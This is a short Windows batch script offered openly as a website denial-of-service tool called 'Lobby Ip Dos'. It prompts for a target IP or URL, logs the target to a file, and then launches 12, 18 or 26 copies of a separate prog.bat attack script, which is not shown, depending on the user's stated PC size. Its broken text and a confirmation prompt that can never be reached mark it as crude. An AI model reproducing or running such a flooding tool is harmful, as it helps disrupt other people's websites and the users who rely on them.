@echo off
color b
title Lobby Ip Dos
cls
echo IpDos can attack website with her ip
echo.
echo Entrer Ip site webb ou url :
echo.
echo.
set /p ip=IpWebsite: 
echo %ip% >> iplog.txt


echo I have a pc :
echo.
echo [1] Small [2] Medium [3] Big
echo.
set /p choix=Entree : 

if "%choix%"=="1" (
goto Small
)
if "%choix%"=="2" (
goto Ok
)
if "%choix%"=="3" (
goto Big
)

pause

echo.
echo Start the attack ?
echo.
pause


:Small
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
exit

:Ok
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
exit

:Big
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat
start prog.bat

exit